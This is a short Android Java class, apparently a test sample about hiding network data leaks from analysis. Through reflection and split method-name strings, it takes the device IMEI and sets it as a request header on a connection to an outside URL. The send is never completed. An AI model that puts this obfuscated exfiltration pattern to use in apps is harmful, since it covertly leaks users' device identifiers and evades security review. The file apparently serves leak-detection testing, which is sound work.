package com.example.network_reflection;


import java.lang.reflect.Constructor;

import java.lang.reflect.Method;


import org.json.JSONObject;

import android.os.AsyncTask;

public class NetworkClass extends AsyncTask{

	@SuppressWarnings({ "unchecked", "rawtypes" })
	@Override
	protected Object doInBackground(Object... params) {
		// TODO Auto-generated method stub
	
		try {
			Class c = Class.forName("com.example.network_reflection.ConcreteClass");
			Object o = c.newInstance();
			Method m = c.getMethod("setIme" +"i", String.class);
			m.invoke(o,params[0].toString());
			
			Method m2 = c.getMethod("getImei");
			String s = (String) m2.invoke(o);
			
			
			Class cl = Class.forName("java.net.URL");
			
			
			Constructor ctor = cl.getConstructor(String.class);
			Object obj = ctor.newInstance(new Object[] { "https://studytutorial.in/post.php" });
			
			Method m3 = cl.getMethod("openConnect"+"ion",null);
			Object ob = m3.invoke(obj);
			
			Class cls = Class.forName("java.net.URLConnection");
						
			Method m4 = cls.getMethod("setRequestProperty",String.class,String.class);
			m4.invoke(ob,new String[]{"IMEI",s});
					
	        JSONObject postDataParams = new JSONObject();
	        postDataParams.put("name", "abc");
	        postDataParams.put("email", "abc@gmail.com");

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
